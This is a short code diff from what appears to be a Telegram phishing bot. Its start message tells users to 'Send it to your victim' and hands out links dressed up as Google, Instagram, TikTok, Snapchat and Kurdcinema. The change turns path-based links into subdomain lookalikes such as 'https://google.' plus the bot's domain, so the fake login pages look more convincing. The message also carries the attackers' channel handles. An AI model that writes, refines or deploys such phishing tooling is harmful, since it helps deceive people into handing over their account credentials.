@@ -24,15 +24,15 @@ async function startHandler(ctx: StartContext) {
 		"@xByteBlitzX\n@SeeYouIOSVIP\n\n" +
 			"Send it to your victim\n\n" +
 			"Google:\n" +
-			`${link}/Google\n\n` +
+			`https://google.${link}\n\n` +
 			"Instagram:\n" +
-			`${link}/Instagram\n\n` +
+			`https://instagram.${link}\n\n` +
 			"Tiktok:\n" +
-			`${link}/Tiktok\n\n` +
+			`https://tiktok.${link}\n\n` +
 			"Snapchat:\n" +
-			`${link}/Snapchat\n\n` +
+			`https://snapchat.${link}\n\n` +
 			"Kurdcinema:\n" +
-			`${link}/Kurdcinama\n\n` +
+			`https://kurdcinama.${link}\n\n` +
 			">>>>\n" +
 			"@xByteBlitzX\n@SeeYouIOSVIP\n@xN1ghtmare",
 		{
